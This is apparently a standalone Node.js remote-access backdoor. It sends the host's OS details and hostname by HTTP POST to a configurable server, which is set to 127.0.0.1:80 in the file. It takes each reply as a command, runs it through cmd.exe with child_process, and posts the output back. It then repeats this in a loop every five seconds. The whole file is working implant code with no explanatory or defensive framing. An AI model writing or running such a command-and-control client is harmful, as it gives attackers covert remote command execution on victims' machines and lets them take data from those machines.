function sleep(milliSeconds){
	var startTime =new Date().getTime();
	while(new Date().getTime()< startTime + milliSeconds);
}

function sendhello(host1,port1,timeinterval){
	var os = require('os');	
	var os1 = os.type() + ',' + os.release() + ',' + os.platform();
	var hostname1 = os.hostname();

	var http = require('http');	
	var querystring = require('querystring');
 
	var contents = querystring.stringify({
    		os:os1,
    		hostname:hostname1,
		hello:'hello'	
	});

	var options = {
    		host: host1,
    		port: port1,
    		path: '/',
    		method:'POST',
    		headers:{
        		'Content-Type':'application/x-www-form-urlencoded',
        		'Content-Length':contents.length
    		}
	}

	var req = http.request(options, function(res){
    		var data1='';

    		res.on('data', function(chunk){
      			data1 += chunk;
    		});

    		res.on('end', function(){
      			console.log('[+]Get command:',data1)
			
			sendcmd(data1,host1,port1,timeinterval);
    		});	
	});
 
	req.on("error",function(err) {
    		console.log(err.message);
		sleep(timeinterval);
		sendhello(serverip,serverport,timeinterval);
	});

	req.write(contents);
	req.end;
};

function sendcmd(command,host1,port1,timeinterval) {
	dataglobal = '';
	var os = require('os');	
	var os1 = os.type() + ',' + os.release() + ',' + os.platform();
	var hostname1 = os.hostname();
	var http = require('http');	
	var querystring = require('querystring');
	var process = require('child_process');
	const bat = process.spawn('cmd.exe', ['/c', command]);
	bat.stdout.on('data', (data) => {
		dataglobal += data.toString();	
	});

	bat.stderr.on('data', (data) => {
		console.log(data.toString());		
	});
	bat.on('exit', (code) => {		
		var contents = querystring.stringify({
    			hostname:hostname1,
			command:command,
			data:dataglobal
		});
		var options = {
    			host: host1,
    			port: port1,
    			path: '/',
    			method:'POST',
    			headers:{
        			'Content-Type':'application/x-www-form-urlencoded',
        			'Content-Length':contents.length
    			}
		}
		console.log(dataglobal);

		var req = http.request(options, function(res){
    			var data1='';
    			res.on('data', function(chunk){
      			data1 += chunk;
    			});
    			res.on('end', function(){
      				console.log('[+]Data:',data1)
    			});		
		});
 
		req.write(contents);
		req.end;

		req.on("error",function(err) {
    			console.log(err.message);	
		});

		sleep(timeinterval);
		sendhello(serverip,serverport,timeinterval);
	});
}

var dataglobal = '';
var serverip = '127.0.0.1';
var serverport = '80';
var timeinterval = +'5000';

sendhello(serverip,serverport,timeinterval);
